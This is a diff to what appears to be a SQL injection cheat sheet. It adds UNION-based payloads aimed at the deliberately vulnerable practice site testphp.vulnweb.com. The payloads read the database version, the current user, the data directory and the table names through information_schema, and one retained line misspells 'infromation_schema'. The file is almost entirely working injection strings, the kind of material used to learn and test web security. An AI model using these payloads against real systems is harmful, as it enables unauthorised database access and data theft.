@@ -777,13 +777,15 @@ Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT que
       ' UNION SELECT 1,2,3--
       ' UNION SELECT 2--
       ' UNION SELECT 3--
+      artists.php?artist=-1 union select 1,version(),3 --+
+      artists.php?artist=-1 union select 1,user(),3 --+
+      artists.php?artist=-1 union select 1,current_user(),3 --+
+      artists.php?artist=-1 union select 1,@@datadir,3 --+
+http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,group_concat(table_name),3%20FROM%20information_schema.tables%20where%20table_schema=database()--+
 
-
-
-
-
+http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,2,3%20--+
 http://testphp.vulnweb.com/artists.php?artist=-2%20UNION%20SELECT%201,table_name,3%20FROM%20infromation_schema.tables%20where%20table_schema=database()
-http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,table_name,3%20FROM%20information_schema.tables%20where%20table_schema=database()
+http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,table_name,3%20FROM%20information_schema.tables%20where%20table_schema=database()--+
 
 
 
